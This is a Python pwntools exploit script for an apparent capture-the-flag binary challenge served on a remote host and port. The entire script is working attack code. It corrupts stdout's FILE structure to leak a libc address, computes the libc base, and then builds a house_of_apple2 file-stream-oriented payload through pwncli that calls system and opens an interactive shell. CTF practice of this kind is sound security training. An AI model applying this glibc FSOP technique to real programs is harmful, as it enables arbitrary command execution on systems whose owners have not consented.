#!/usr/bin/env python3
from pwn import *
from os import getcwd
import pwncli

# -------------------------- INFO -------------------------- #
# Arch:       amd64-64-little
# RELRO:      Full RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        PIE enabled
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No

# ------------------------- TARGET ------------------------- #
exe = context.binary = ELF(args.EXE or "./chall")
rop = ROP(exe)

# ------------------------- REMOTE ------------------------- #
host = args.HOST or "34.252.33.37"
port = int(args.PORT or 30681)

# -------------------------- LIBC -------------------------- #
libc = ELF(args.LIBC or "./libc.so.6")
rop_libc = ROP(libc)

# -------------------------- START ------------------------- #
gdbscript = """
b *_IO_flush_all
b *_IO_wfile_overflow
b *_IO_wdoallocbuf
c
"""

if args.REMOTE:
    p = remote(host, port)
else:
    p = process(["./ld.so.2", exe.path], env={"LD_LIBRARY_PATH": getcwd()})
    if args.DBG:
        gdb.attach(p, gdbscript=gdbscript)

# ------------------------- EXPLOIT ------------------------ #

# Leak LIBC (https://hackmd.io/@whoisthatguy/Hke0xJaLWp#2-leak-libc)
payload = b""
# _flags = _IO_MAGIC | _IO_CURRENTLY_PUTTING | _IO_IS_APPENDING
payload += p32(0xFBAD1800)
payload += p32(0)  # _unused0
payload += p64(0)  # _IO_read_ptr
payload += p64(0)  # _IO_read_end
payload += p64(0)  # _IO_read_end

# \x00 zero terminate will be written to _IO_write_base last byte
# So, write base will point to some address containing LIBC address
p.sendlineafter(b"stdout:\n", payload)
libc_leak = u64(p.recv(8))
info(f"LIBC LEAK: 0x{libc_leak:x}")

# Calculate LIBC address
libc.address = libc_leak - (libc.sym._IO_2_1_stdout_ + 132)
info(f"LIBC ADDRESS: 0x{libc.address:x}")
p.clean()

# Craft FSOP exploit
fs = pwncli.io_file.IO_FILE_plus_struct()
payload = fs.house_of_apple2_execmd_when_exit(
    libc.sym["_IO_2_1_stderr_"], libc.sym["_IO_wfile_jumps"], libc.sym["system"]
)

p.sendline(payload)

p.interactive()
